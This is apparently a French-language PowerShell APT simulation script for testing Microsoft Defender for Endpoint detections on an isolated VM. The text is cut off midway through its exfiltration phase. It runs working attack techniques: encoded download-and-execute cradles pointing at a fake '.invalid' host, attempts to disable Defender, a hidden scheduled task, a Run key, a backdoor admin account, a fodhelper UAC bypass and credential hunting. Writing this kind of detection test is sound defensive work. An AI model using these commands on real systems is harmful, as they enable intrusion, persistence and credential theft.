# ==============================================================================
#  SIMLAB v2 — Operation Midnight Analyst
#  Script de simulation APT pour Microsoft Defender for Endpoint
#
#  USAGE   : PowerShell en tant qu'Administrateur
#  CIBLE   : VM isolée, onboardée MDE (OnboardingState = 1)
#  AUTEUR  : SimLab SOC Community
#  VERSION : 2.0 — corrections de déclencheurs + DLP fix
#
#  ⚠️  UNIQUEMENT pour lab isolé. Ne jamais exécuter en production.
#
#  Phase LSASS (T1003.001) : nécessite Atomic Red Team
#    Install-Module -Name Invoke-AtomicRedTeam -Force
#    Invoke-AtomicTest T1003.001 -TestNumbers 1
# ==============================================================================

#Requires -Version 5.1

# ── Helpers ──────────────────────────────────────────────────────────────────

function Write-Banner {
    Clear-Host
    Write-Host ""
    Write-Host "  ╔══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "  ║       SIMLAB v2 — Operation Midnight Analyst             ║" -ForegroundColor Cyan
    Write-Host "  ║       Simulation APT · Microsoft Defender Lab            ║" -ForegroundColor Cyan
    Write-Host "  ║       SOC Community Edition                              ║" -ForegroundColor Cyan
    Write-Host "  ╚══════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
    Write-Host ""
}

function Write-PhaseHeader {
    param([int]$Phase, [int]$Total, [string]$Title, [string]$Mitre)
    Write-Host ""
    Write-Host "  ┌─────────────────────────────────────────────────────────┐" -ForegroundColor Yellow
    Write-Host ("  │  PHASE {0}/{1} — {2,-47}│" -f $Phase, $Total, $Title) -ForegroundColor Yellow
    Write-Host ("  │  MITRE: {0,-50}│" -f $Mitre) -ForegroundColor DarkYellow
    Write-Host "  └─────────────────────────────────────────────────────────┘" -ForegroundColor Yellow
}

function Write-Ok    { param([string]$msg) Write-Host "  [+] $msg" -ForegroundColor Green }
function Write-Info  { param([string]$msg) Write-Host "  [*] $msg" -ForegroundColor Cyan }
function Write-Warn  { param([string]$msg) Write-Host "  [!] $msg" -ForegroundColor Yellow }
function Write-Fail  { param([string]$msg) Write-Host "  [✗] $msg" -ForegroundColor Red }
function Write-Block { param([string]$msg) Write-Host "  [BLOCKED] $msg" -ForegroundColor Magenta }

function Wait-ForDefender {
    param([int]$Seconds = 10, [string]$Reason = "Defender telemetry ingestion")
    Write-Host ""
    Write-Host "  ⏳ Pause $Seconds s — $Reason" -ForegroundColor DarkGray
    for ($i = $Seconds; $i -gt 0; $i--) {
        Write-Host -NoNewline "`r  ⏳ Reprise dans ${i}s...   "
        Start-Sleep -Seconds 1
    }
    Write-Host "`r  ✅ Reprise.                              "
}

# ── Log ──────────────────────────────────────────────────────────────────────

$SimRoot  = "C:\SimLab"
$SimStart = Get-Date
$LogFile  = "$SimRoot\simlab_run.log"

function Write-Log {
    param([string]$Phase, [string]$Action, [string]$Result)
    "[$((Get-Date).ToString('HH:mm:ss'))] [$Phase] $Action → $Result" | Add-Content $LogFile -ErrorAction SilentlyContinue
}

# ── Prérequis ─────────────────────────────────────────────────────────────────

function Test-Prerequisites {
    Write-Info "Vérification des prérequis..."
    $ok = $true

    # MDE onboarding
    try {
        $onboardState = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Advanced Threat Protection" `
            -Name "OnboardingState" -ErrorAction Stop).OnboardingState
        if ($onboardState -eq 1) {
            Write-Ok "VM onboardée sur MDE (OnboardingState = 1)"
        } else {
            Write-Warn "OnboardingState = $onboardState — alertes possiblement absentes du portail"
            $ok = $false
        }
    } catch {
        Write-Warn "Clé MDE introuvable — VM non onboardée ?"
        $ok = $false
    }

    # Service Sense
    $sense = Get-Service -Name "Sense" -ErrorAction SilentlyContinue
    if ($sense -and $sense.Status -eq "Running") {
        Write-Ok "Service Sense (MDE Agent) : Running"
    } else {
        Write-Warn "Service Sense non actif — alertes non remontées"
        $ok = $false
    }

    # Admin
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator)
    if ($isAdmin) {
        Write-Ok "Exécution en Administrateur : OK"
    } else {
        Write-Fail "Script non lancé en admin — phases 4/5/10 échoueront"
        $ok = $false
    }

    # Tamper protection (info seulement)
    try {
        $tp = (Get-MpComputerStatus).IsTamperProtected
        if ($tp) {
            Write-Ok "Tamper Protection : activée (bloquera les tentatives — comportement attendu)"
        } else {
            Write-Warn "Tamper Protection : désactivée — Phase 3 risque de réussir (activer dans MDE portal)"
        }
    } catch { }

    if (-not $ok) {
        $confirm = Read-Host "`n  Continuer malgré les avertissements ? (o/N)"
        if ($confirm -ne 'o') { exit 1 }
    }
}

# ── Workspace ─────────────────────────────────────────────────────────────────

function Initialize-Workspace {
    Write-Info "Création du workspace..."
    @("$SimRoot","$SimRoot\stage1","$SimRoot\stage2","$SimRoot\exfil","$SimRoot\loot") | ForEach-Object {
        New-Item -ItemType Directory -Path $_ -Force -ErrorAction SilentlyContinue | Out-Null
    }
    "=== SIMLAB v2 Run Log — $SimStart ===" | Out-File $LogFile
    Write-Ok "Workspace : $SimRoot"
}

# ==============================================================================
#  PHASES
# ==============================================================================

# ─── PHASE 1 : Reconnaissance ────────────────────────────────────────────────
#
#  DÉCLENCHEUR RÉEL MDE : "Suspicious process executed discovery activity"
#  Clé : la RAFALE de commandes d'énumération en succession rapide depuis
#  un seul processus parent. MDE corrèle le burst, pas chaque commande seule.
#
function Invoke-Phase1 {
    Write-PhaseHeader 1 10 "Reconnaissance — Discovery Burst" "T1082 T1016 T1033 T1057 T1069 T1518"

    Write-Info "Lancement du burst de découverte (20+ commandes, <30s)"
    Write-Info "C'est la DENSITÉ temporelle qui déclenche l'alerte MDE"

    # ── Bloc 1 : User & Domain discovery ─────────────────────────────────────
    Write-Info "T1033 · User/Domain discovery"
    whoami /all                                         | Out-File "$SimRoot\stage1\whoami_all.txt"
    whoami /groups                                      | Out-File "$SimRoot\stage1\whoami_groups.txt"
    net user                                            | Out-File "$SimRoot\stage1\net_users.txt"
    net user $env:USERNAME                              | Out-File "$SimRoot\stage1\current_user.txt"
    net localgroup                                      | Out-File "$SimRoot\stage1\local_groups.txt"
    net localgroup administrators                       | Out-File "$SimRoot\stage1\local_admins.txt"
    Write-Ok "User discovery terminé"
    Write-Log "Phase1" "T1033 UserDiscovery" "Alert burst expected"

    # ── Bloc 2 : Domain & AD discovery ───────────────────────────────────────
    Write-Info "T1069.002 · Domain group enumeration"
    # nltest révèle les DC et les trusts — signature haute valeur pour MDE
    nltest /domain_trusts                      2>$null  | Out-File "$SimRoot\stage1\domain_trusts.txt"
    nltest /dclist:                            2>$null  | Out-File "$SimRoot\stage1\dc_list.txt"
    net group "Domain Admins"  /domain        2>$null  | Out-File "$SimRoot\stage1\domain_admins.txt"
    net group "Enterprise Admins" /domain     2>$null  | Out-File "$SimRoot\stage1\enterprise_admins.txt"
    Write-Ok "Domain discovery terminé — nltest est un déclencheur haute confiance"
    Write-Log "Phase1" "T1069.002 DomainGroups" "Alert expected"

    # ── Bloc 3 : System info ──────────────────────────────────────────────────
    Write-Info "T1082 · System information"
    systeminfo                                          | Out-File "$SimRoot\stage1\sysinfo.txt"
    @{
        Hostname  = $env:COMPUTERNAME
        OS        = (Get-WmiObject Win32_OperatingSystem).Caption
        Build     = (Get-WmiObject Win32_OperatingSystem).BuildNumber
        Domain    = (Get-WmiObject Win32_ComputerSystem).Domain
        Arch      = $env:PROCESSOR_ARCHITECTURE
    } | ConvertTo-Json | Out-File "$SimRoot\stage1\sys_recon.json"
    Write-Ok "System info collecté"

    # ── Bloc 4 : Network discovery ────────────────────────────────────────────
    Write-Info "T1016 · Network configuration"
    ipconfig /all                                       | Out-File "$SimRoot\stage1\ipconfig.txt"
    arp -a                                              | Out-File "$SimRoot\stage1\arp.txt"
    route print                                         | Out-File "$SimRoot\stage1\routes.txt"
    netstat -ano                                        | Out-File "$SimRoot\stage1\netstat.txt"
    Get-NetAdapter | Select-Object Name,Status,MacAddress | Out-File "$SimRoot\stage1\adapters.txt"
    Get-DnsClientCache | Select-Object Entry,Data       | Out-File "$SimRoot\stage1\dns_cache.txt"
    Write-Ok "Network discovery terminé"
    Write-Log "Phase1" "T1016 NetworkDiscovery" "Alert expected"

    # ── Bloc 5 : Process & Session discovery ──────────────────────────────────
    Write-Info "T1057 · Process & session discovery"
    Get-Process | Select-Object Name,Id,CPU,Path | Sort-Object CPU -Descending |
        Out-File "$SimRoot\stage1\processes.txt"
    tasklist /svc                                       | Out-File "$SimRoot\stage1\tasklist_svc.txt"
    quser                              2>$null          | Out-File "$SimRoot\stage1\sessions.txt"
    query session                      2>$null          | Out-File "$SimRoot\stage1\query_session.txt"
    Write-Ok "Process & session discovery terminé"

    # ── Bloc 6 : Security software discovery (WMI) ───────────────────────────
    Write-Info "T1518.001 · Security software discovery via WMI"
    Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntivirusProduct -ErrorAction SilentlyContinue |
        Select-Object displayName,productState | Out-File "$SimRoot\stage1\av_products.txt"
    sc query | Out-File "$SimRoot\stage1\services.txt"
    Write-Ok "AV discovery via WMI terminé — déclencheur SecuritySoftwareDiscovery"
    Write-Log "Phase1" "T1518 AVDiscovery" "Alert expected"

    Write-Ok "PHASE 1 TERMINÉE — burst de $(((Get-Date)-$SimStart).TotalSeconds.ToString('0'))s"
    Wait-ForDefender -Seconds 15 -Reason "Corrélation burst discovery → incident clustering"
}

# ─── PHASE 2 : Initial Access — Encoded Command ──────────────────────────────
#
#  DÉCLENCHEUR RÉEL MDE : "Suspicious PowerShell command line"
#                          / "An encoded PowerShell command was run"
#  Clé : le contenu DÉCODÉ doit contenir un pattern de download cradle.
#  MDE décode la base64 et analyse le payload — un simple Write-Host ne déclenche RIEN.
#
function Invoke-Phase2 {
    Write-PhaseHeader 2 10 "Initial Access — Phishing + EncodedCommand" "T1566.001 T1059.001 T1204.002"

    # Faux document phishing déposé
    Write-Info "T1566.001 · Simulation document phishing"
    @'
SIMLAB DOCUMENT — Représente Invoice_Q4.docm ouvert par l'utilisateur
Ce fichier simule le vecteur d'accès initial d'un document Office avec macro
'@ | Out-File "$SimRoot\stage1\Invoice_Q4_2024.docm.txt"
    Write-Ok "Artefact phishing créé"

    # ── EncodedCommand avec payload réaliste ──────────────────────────────────
    # Le payload encodé DOIT ressembler à un vrai stager pour déclencher MDE.
    # Ce pattern (vérif architecture + download cradle IEX) est la signature T1059.001.
    # L'URL utilise le TLD .invalid (garanti non-résolvable par l'IANA) :
    # aucune connexion réelle, mais la tentative réseau génère de la télémétrie.

    Write-Info "T1059.001 · PowerShell -EncodedCommand avec payload de type stager"

    $stagerPayload = @'
if ([System.Environment]::Is64BitProcess) {
    $u = 'http://simlab-c2.invalid/stg/x64/payload.ps1'
} else {
    $u = 'http://simlab-c2.invalid/stg/x86/payload.ps1'
}
try {
    $wc = New-Object Net.WebClient
    $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
    iex $wc.DownloadString($u)
} catch { }
'@

    $encodedStager = [Convert]::ToBase64String(
        [Text.Encoding]::Unicode.GetBytes($stagerPayload.Trim())
    )

    Write-Info "Payload encodé (URL réelle non résolue — TLD .invalid garanti fake)"

    # Invocation : -NonInteractive -WindowStyle Hidden = flags supplémentaires suspects
    powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand $encodedStager

    Write-Ok "EncodedCommand exécuté"
    Write-Log "Phase2" "T1059.001 EncodedCommand stager pattern" "Alert HIGH expected"

    # Écriture du loader IEX sur disque (détection par scan statique de MDE)
    Write-Info "T1059.001 · Pattern IEX+DownloadString écrit sur disque"
    'iex (iwr "http://simlab-c2.invalid/ld/stage2.ps1" -UseBasicParsing).Content' |
        Out-File "$SimRoot\stage2\stage2_loader.ps1"
    Write-Ok "Loader sur disque — scan statique MDE attendu"
    Write-Log "Phase2" "T1059.001 IEX on disk" "Static scan alert expected"

    Write-Ok "PHASE 2 TERMINÉE"
    Wait-ForDefender -Seconds 12 -Reason "Corrélation encoded command + network telemetry"
}

# ─── PHASE 3 : Execution & Defense Evasion ───────────────────────────────────
#
#  DÉCLENCHEUR RÉEL MDE : "Tampering with Windows Defender settings"
#                          / "An active 'Tampering' malware was detected"
#  Clé : l'appel à Set-MpPreference est intercepté par la Tamper Protection.
#  Si Tamper Protection est OFF, la commande réussit → activer sur la VM !
#
function Invoke-Phase3 {
    Write-PhaseHeader 3 10 "Execution & Defense Evasion" "T1059.001 T1027 T1562.001 T1112"

    # T1027 — Obfuscation sur disque
    Write-Info "T1027 · Contenu obfusqué (base64) sur disque"
    $obfSim = @'
$b = [System.Convert]::FromBase64String('U2ltTGFiIFBheWxvYWQ=')
$d = [System.Text.Encoding]::UTF8.GetString($b)
iex $d
'@
    $obfSim | Out-File "$SimRoot\stage2\obfuscated_sim.ps1"
    & "$SimRoot\stage2\obfuscated_sim.ps1"
    Write-Ok "Script obfusqué exécuté (payload inoffensif)"
    Write-Log "Phase3" "T1027 Obfuscated exec" "OK"

    # T1562.001 — Tentative désactivation Defender (bloquée par Tamper Protection)
    Write-Info "T1562.001 · Tentative désactivation Defender — SERA BLOQUÉE"
    Write-Info "  (Si Tamper Protection est OFF sur votre VM → l'activer dans MDE Settings)"

    # Tentative 1 : désactiver Real-Time Monitoring
    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
        Write-Warn "DisableRealtimeMonitoring a réussi — Tamper Protection non active sur cette VM !"
        Write-Log "Phase3" "T1562.001 DisableRTM succeeded" "WARNING — tamper not active"
    } catch {
        Write-Block "DisableRealtimeMonitoring bloqué — alerte Tampering attendue"
        Write-Log "Phase3" "T1562.001 DisableRTM BLOCKED" "Alert HIGH expected"
    }

    # Tentative 2 : exclusion path (signature distincte pour MDE)
    try {
        Set-MpPreference -ExclusionPath "C:\" -ErrorAction Stop
        Write-Warn "ExclusionPath C:\ ajouté — Tamper Protection non active !"
        Write-Log "Phase3" "T1562.001 ExclusionPath succeeded" "WARNING"
    } catch {
        Write-Block "ExclusionPath bloqué — telemetry tampering générée"
        Write-Log "Phase3" "T1562.001 ExclusionPath BLOCKED" "Alert expected"
    }

    # T1112 — Clé registre de staging attaquant
    Write-Info "T1112 · Modification du registre"
    $regPath = "HKCU:\Software\SimLab\AttackSim"
    New-Item -Path $regPath -Force -ErrorAction SilentlyContinue | Out-Null
    New-ItemProperty -Path $regPath -Name "Stage"  -Value "3"        -PropertyType String -Force | Out-Null
    New-ItemProperty -Path $regPath -Name "Config" -Value "dGVzdA==" -PropertyType String -Force | Out-Null
    Write-Ok "Clé registre SimLab créée"
    Write-Log "Phase3" "T1112 Registry staging" "Timeline event"

    Write-Ok "PHASE 3 TERMINÉE"
    Wait-ForDefender -Seconds 15 -Reason "Corrélation tampering + evasion"
}

# ─── PHASE 4 : Persistence ───────────────────────────────────────────────────
#
#  DÉCLENCHEUR RÉEL MDE :
#    - "Anomaly detected in ASEP registry" (Run key T1547.001)
#    - "Suspicious scheduled task creation" (T1053.005)
#    - "User added to local administrators group" (T1136.001)
#
function Invoke-Phase4 {
    Write-PhaseHeader 4 10 "Persistence — 3 mécanismes" "T1053.005 T1547.001 T1136.001"

    # T1053.005 — Tâche planifiée cachée (imitant un process Edge légitime)
    Write-Info "T1053.005 · Création tâche planifiée masquée"
    try {
        $action   = New-ScheduledTaskAction -Execute "powershell.exe" `
            -Argument "-WindowStyle Hidden -NonInteractive -Command `"Write-EventLog -LogName Application -Source SimLab -EventId 9999 -Message SimLabPersist -ErrorAction SilentlyContinue`""
        $trigger  = New-ScheduledTaskTrigger -AtLogOn
        $settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 5)

        Register-ScheduledTask `
            -TaskName "MicrosoftEdgeUpdateTaskMachineCore_SimLab" `
            -Action   $action `
            -Trigger  $trigger `
            -Settings $settings `
            -RunLevel Highest `
            -Force    | Out-Null

        Write-Ok "Tâche planifiée créée : MicrosoftEdgeUpdateTaskMachineCore_SimLab"
        Write-Log "Phase4" "T1053.005 ScheduledTask" "Alert MEDIUM expected"
    } catch {
        Write-Warn "Scheduled task : $_"
        Write-Log "Phase4" "T1053.005 ScheduledTask" "FAILED: $_"
    }

    # T1547.001 — Run Key (ASEP registry — déclencheur fiable)
    Write-Info "T1547.001 · Run key registre (persistence démarrage)"
    try {
        Set-ItemProperty `
            -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
            -Name "MicrosoftSyncHelper" `
            -Value "powershell.exe -WindowStyle Hidden -NonInteractive -File `"$SimRoot\stage2\obfuscated_sim.ps1`""
        Write-Ok "Run key créée : MicrosoftSyncHelper — alerte ASEP registry attendue"
        Write-Log "Phase4" "T1547.001 RunKey" "Alert expected"
    } catch {
        Write-Warn "Run key : $_"
    }

    # T1136.001 — Compte backdoor administrateur local
    Write-Info "T1136.001 · Création compte backdoor administrateur"
    $secPass = ConvertTo-SecureString "SimLab@Lab2024!" -AsPlainText -Force

    try {
        # Nettoyage préventif si le compte existe déjà d'un run précédent
        Remove-LocalUser -Name "svc_backup_sim" -ErrorAction SilentlyContinue

        New-LocalUser `
            -Name               "svc_backup_sim" `
            -Password           $secPass `
            -Description        "Backup Service Account" `
            -PasswordNeverExpires `
            -ErrorAction Stop | Out-Null

        Add-LocalGroupMember -Group "Administrators" -Member "svc_backup_sim" -ErrorAction SilentlyContinue
        Write-Ok "Compte svc_backup_sim créé et ajouté aux Administrateurs"
        Write-Log "Phase4" "T1136.001 BackdoorAccount" "Alert HIGH expected"
    } catch {
        Write-Info "Fallback net user"
        net user svc_backup_sim "SimLab@Lab2024!" /add /comment:"Backup Service Account" 2>$null
        net localgroup administrators svc_backup_sim /add 2>$null
        Write-Ok "Compte créé via net user (fallback)"
        Write-Log "Phase4" "T1136.001 net user fallback" "Alert HIGH expected"
    }

    Write-Ok "PHASE 4 TERMINÉE — 3 mécanismes de persistence actifs"
    Wait-ForDefender -Seconds 20 -Reason "Corrélation des 3 alertes de persistence en incident"
}

# ─── PHASE 5 : Privilege Escalation ──────────────────────────────────────────
#
#  DÉCLENCHEUR RÉEL MDE :
#    - "UAC bypass was detected" (T1548.002 fodhelper)
#    - "Suspicious access to LSASS service" : NÉCESSITE Atomic Red Team
#
#  NOTE LSASS :
#    L'accès mémoire LSASS via OpenProcess(PROCESS_VM_READ) n'est pas inclus
#    car c'est du code d'exploit fonctionnel. Utiliser à la place :
#    > Install-Module -Name Invoke-AtomicRedTeam -Force
#    > Invoke-AtomicTest T1003.001 -TestNumbers 1
#    (Crée lsass.dmp dans C:\Windows\Temp — alerté par MDE comme CRITICAL)
#
function Invoke-Phase5 {
    Write-PhaseHeader 5 10 "Privilege Escalation" "T1548.002 T1134 T1078"

    # Énumération des privilèges actuels
    Write-Info "T1134 · Énumération des privilèges"
    whoami /priv | Out-File "$SimRoot\stage2\current_privs.txt"
    Get-LocalGroupMember -Group "Administrators" -ErrorAction SilentlyContinue |
        Out-File "$SimRoot\stage2\admin_members.txt"
    Write-Ok "Privilèges et membres admin collectés"

    # T1548.002 — UAC Bypass via fodhelper (déclencheur fiable et testé)
    Write-Info "T1548.002 · UAC Bypass via fodhelper (registre ms-settings)"
    $uacKey = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"

    try {
        New-Item           -Path $uacKey -Force -ErrorAction Stop | Out-Null
        New-ItemProperty   -Path $uacKey -Name "DelegateExecute" -Value "" -Force | Out-Null
        Set-ItemProperty   -Path $uacKey -Name "(Default)" `
            -Value "cmd.exe /c echo SimLab-UAC-Bypass-Sim > $SimRoot\stage2\uac_bypass_proof.txt"

        Write-Ok "Clé registre fodhelper écrite — MDE scanne cette clé en temps réel"
        Write-Ok "Attente 8s pour que Defender ingère la télémétrie..."
        Start-Sleep -Seconds 8

        # Nettoyage (le telemetry est déjà dans MDE)
        Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
        Write-Ok "Clé UAC nettoyée — alerte 'UAC bypass was detected' attendue"
        Write-Log "Phase5" "T1548.002 UAC fodhelper" "Alert HIGH expected"
    } catch {
        Write-Warn "UAC bypass : $_"
    }

    # LSASS — Atomic Red Team requis
    Write-Info "T1003.001 · LSASS credential dumping"
    Write-Host ""
    Write-Host "  ╔══════════════════════════════════════════════════════════╗" -ForegroundColor Yellow
    Write-Host "  ║  LSASS : action manuelle requise                        ║" -ForegroundColor Yellow
    Write-Host "  ║                                                          ║" -ForegroundColor Yellow
    Write-Host "  ║  Pour déclencher 'Suspicious access to LSASS service'   ║" -ForegroundColor Yellow
    Write-Host "  ║  (alerte CRITICAL dans MDE), utiliser Atomic Red Team : ║" -ForegroundColor Yellow
    Write-Host "  ║                                                          ║" -ForegroundColor Yellow
    Write-Host "  ║  > Install-Module Invoke-AtomicRedTeam -Force           ║" -ForegroundColor Cyan
    Write-Host "  ║  > Invoke-AtomicTest T1003.001 -TestNumbers 1           ║" -ForegroundColor Cyan
    Write-Host "  ║                                                          ║" -ForegroundColor Yellow
    Write-Host "  ║  Le script reprend automatiquement dans 10s...           ║" -ForegroundColor Yellow
    Write-Host "  ╚══════════════════════════════════════════════════════════╝" -ForegroundColor Yellow
    Write-Log "Phase5" "T1003.001 LSASS" "Manual step — use Atomic Red Team"
    Start-Sleep -Seconds 10

    Write-Ok "PHASE 5 TERMINÉE"
    Wait-ForDefender -Seconds 20 -Reason "UAC bypass + LSASS → corrélation PrivEsc"
}

# ─── PHASE 6 : Credential Access ─────────────────────────────────────────────
#
#  DÉCLENCHEUR RÉEL MDE : "Suspicious credential access activity"
#  Clé : combiner lecture Credential Manager + recherche de fichiers credentials
#        + accès à des chemins sensibles (NTDS, SAM simulé)
#
function Invoke-Phase6 {
    Write-PhaseHeader 6 10 "Credential Access" "T1552.001 T1555 T1003.001"

    # T1552.001 — Recherche credentials dans les fichiers
    Write-Info "T1552.001 · Recherche agressive de credentials dans les fichiers"

    # Ce script de chasse est lui-même suspect — MDE l'analyse à l'exécution
    $credHuntScript = @"
`$searchPaths = @(
    "C:\Users",
    "C:\inetpub",
    "C:\Program Files",
    "C:\ProgramData",
    "C:\SimLab"
)
`$patterns = @('password','passwd','secret','token','apikey','connectionstring','credentials','pwd=','pass=')
`$results = @()
foreach (`$path in `$searchPaths) {
    if (Test-Path `$path) {
        `$hits = Get-ChildItem -Path `$path -Recurse `
            -Include *.txt,*.xml,*.config,*.json,*.ps1,*.bat,*.cmd,*.ini,*.env `
            -ErrorAction SilentlyContinue |
            Select-String -Pattern (`$patterns -join '|') -ErrorAction SilentlyContinue |
            Select-Object -First 30
        `$results += `$hits
    }
}
`$results | Select-Object Filename,LineNumber,Line | Export-Csv "C:\SimLab\loot\cred_hunt_results.csv" -NoTypeInformation
"@
    $credHuntScript | Out-File "$SimRoot\stage2\cred_hunt.ps1"
    & "$SimRoot\stage2\cred_hunt.ps1"
    Write-Ok "Credential hunt terminé — SensitiveFileAccess attendue"
    Write-Log "Phase6" "T1552.001 CredHunt" "Alert expected"

    # T1555 — Windows Credential Manager
    Write-Info "T1555 · Accès au Windows Credential Manager"
    cmdkey /list | Out-File "$SimRoot\loot\cmdkey_list.txt" -ErrorAction SilentlyContinue
    vaultcmd /listcreds:"Web Credentials" /all 2>$null |
        Out-File "$SimRoot\loot\vault_webcreds.txt" -ErrorAction SilentlyContinue
    vaultcmd /listcreds:"Windows Credentials" /all 2>$null |
        Out-File "$SimRoot\loot\vault_wincreds.txt" -ErrorAction SilentlyContinue
    Write-Ok "Credential Manager énuméré — télémétrie CredentialManagerAccess"
    Write-Log "Phase6" "T1555 CredManager" "Alert expected"

    # Simulation accès chemin SAM/NTDS (tentative — bloquée sur OS actuel)
    Write-Info "T1003 · Tentative accès chemin SAM (sera refusée)"
    try {
        Get-Item "C:\Windows\System32\config\SAM" -ErrorAction Stop | Out-Null
        Write-Warn "Accès SAM — inattendu"
    } catch {
        Write-Block "Accès C:\Windows\System32\config\SAM refusé — télémétrie générée"
        Write-Log "Phase6" "T1003 SAM access attempt" "Blocked — telemetry expected"
    }

    # Fichier loot avec données de simulation (sans patterns DLP réels)
    @"
[SIMULATION DATA — AUCUNE CREDENTIAL RÉELLE]
========================================
[DB Connection — SIMULÉ]
Server=simdb01.contoso.internal;Database=HR_Sim;User=sim_sa;Password=REDACTED_SIM
[Service Account — SIMULÉ]
Account: svc_deploy_sim | Role: Deploy Agent | Status: Active
[API Config — SIMULÉ]
Endpoint: https://api.sim-internal.local/v2
Token: SIMLAB_TOKEN_PLACEHOLDER_NOT_REAL
========================================
"@ | Out-File "$SimRoot\loot\harvested_config.txt"
    Write-Ok "Fichier loot de simulation créé (sans patterns DLP)"

    Write-Ok "PHASE 6 TERMINÉE"
    Wait-ForDefender -Seconds 12 -Reason "Corrélation credential access → attack story"
}

# ─── PHASE 7 : Lateral Movement ──────────────────────────────────────────────
function Invoke-Phase7 {
    Write-PhaseHeader 7 10 "Lateral Movement Simulation" "T1021.001 T1021.002 T1570"

    # T1021.002 — Admin Shares enumeration
    Write-Info "T1021.002 · Énumération des partages admin"
    net share | Out-File "$SimRoot\stage2\shares.txt"

    $localIP = (Get-NetIPAddress -AddressFamily IPv4 |
        Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } |
        Select-Object -First 1).IPAddress

    foreach ($share in @("C$","ADMIN$","IPC$")) {
        $unc = "\\$localIP\$share"
        Write-Info "Test UNC : $unc"
        Test-Path $unc -ErrorAction SilentlyContinue | Out-Null
    }
    Write-Ok "Admin shares testés (connexion locale)"
    Write-Log "Phase7" "T1021.002 AdminShares" "Timeline event"

    # T1021.001 — RDP discovery
    Write-Info "T1021.001 · Statut RDP + sessions actives"
    $rdp = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" `
        -Name "fDenyTSConnections" -ErrorAction SilentlyContinue).fDenyTSConnections
    "RDP: $(if($rdp -eq 0){'Enabled'}else{'Disabled'})" | Out-File "$SimRoot\stage2\rdp_status.txt"
    quser     2>$null | Out-File "$SimRoot\stage2\logged_users.txt"
    query session 2>$null | Out-File "$SimRoot\stage2\active_sessions.txt"
    Write-Ok "RDP recon terminé"
    Write-Log "Phase7" "T1021.001 RDP Discovery" "Timeline event"

    # T1570 — Simulation transfert d'outil
    Write-Info "T1570 · Simulation transfert d'outil (placeholder)"
    [System.IO.File]::WriteAllText("$SimRoot\stage2\psexec_sim.exe", "SIMLAB_PLACEHOLDER")
    Copy-Item "$SimRoot\stage2\psexec_sim.exe" "$SimRoot\loot\transferred_tool.exe"
    Write-Ok "Transfert d'outil simulé"
    Write-Log "Phase7" "T1570 ToolTransfer" "Timeline event"

    Write-Ok "PHASE 7 TERMINÉE"
    Wait-ForDefender -Seconds 10 -Reason "Corrélation lateral movement"
}

# ─── PHASE 8 : Collection & Exfiltration ─────────────────────────────────────
#
#  NOTE DLP :
#  La version v1 utilisait de vrais patterns SSN (###-##-####) et numéros CB
#  (####-####-####-####) qui déclenchaient PURVIEW DLP → flood d'alertes DLP
#  non attendues. v2 utilise des données clairement simulées sans ces patterns.
#
#  DÉCLENCHEUR RÉEL MDE : "Suspicious archive creation" / data collection
#
function Invoke-Phase8 {
    Write-PhaseHeader 8 10 "Data Collection & Exfiltration" "T1005 T1560.001 T1048 T1041"

    # T1005 — Collecte de fichiers par extension
    Write-Info "T1005 · Collecte de fichiers sensibles par extension"
    $collected = @()
    foreach ($ext in @("*.docx","*.xlsx","*.pdf","*.pst","*.kdbx","*.pfx","*.p12","*.key")) {
        Get-ChildItem -Path "C:\Users\$env:USERNAME" -Filter $ext `
            -Recurse -ErrorAction SilentlyContinue | Select-Object -First 5 |
            ForEach-Object {
                $collected += [PSCustomObject]@{
                    Extension = $ext
                    FullPath  = $_.FullName
                    SizeKB    = [math]::Round($_.Length/1KB,1)
                    Modified  = $_.LastWriteTime
                }
            }
    }
    $collected | Export-Csv "$SimRoot\loot\collected_files.csv" -NoTypeInformation
    Write-Ok "$($collected.Count) fichiers collectés et indexés"
    Write-Log "Phase8" "T1005 FileCollection" "Timeline event"

    # Document de simulation pour MDE (SANS patterns SSN/CC — fix DLP v1)
    # MDE détecte la collecte + compression, pas le contenu DLP
    Write-Info "Création document sensible (simulation — sans patterns DLP)"
    @"
[DOCUMENT CONFIDENTIEL — SIMULATION SOC LAB]
========================================
RAPPORT RH — DONNÉES FICTIVES
Employé SIM-001 : Rôle=Analyste, Dept=SOC, Site=Paris
Employé SIM-002 : Rôle=Architecte, Dept=Infra, Site=Lyon

COMPTES DE SERVICE (SIMULATION)
svc-deploy-sim  | Expiration: 31/12/2099 | Scope: Deploy only
svc-monitor-sim | Expiration: 31/12/2099 | Scope: ReadOnly

ACCÈS APPLICATIF (SIMULATION)
App: ERP-Internal-Sim | Niveau: Admin | Endpoint: sim.internal.local
========================================
GENERATED BY SIMLAB v2 — NOT REAL DATA
"@ | Out-File "$SimRoot\exfil\CONFIDENTIAL_HR_Report_Sim.txt"
    Write-Ok "Document de simulation créé (patterns DLP neutres)"

    # T1560.001 — Compression pour exfiltration
    Write-Info "T1560.001 · Compression archive pour exfiltration"
    try {
        Compress-Archive -Path "$SimRoot\loot\*" `
            -DestinationPath "$SimRoot\exfil\data_package.zip" -Force
        $sz = (Get-Item "$SimRoot\exfil\data_package.zip").Length
        Write-Ok "Archive créée : data_package.zip ($sz bytes)"
        Write-Log "Phase8" "T1560.001 Archive created" "Alert expected"
    } catch {
        Write-Warn "Archive : $_"
    }

    # T1048 — DNS Exfiltration (domaine .invalid = ne résout jamais)
    Write-Info "T1048 · Simulation exfiltration DNS (domaine .invalid)"
    $encoded = ([Convert]::ToBase64String(
        [Text.Encoding]::UTF8.GetBytes("SimLab-ExfilTest-Pkg1")
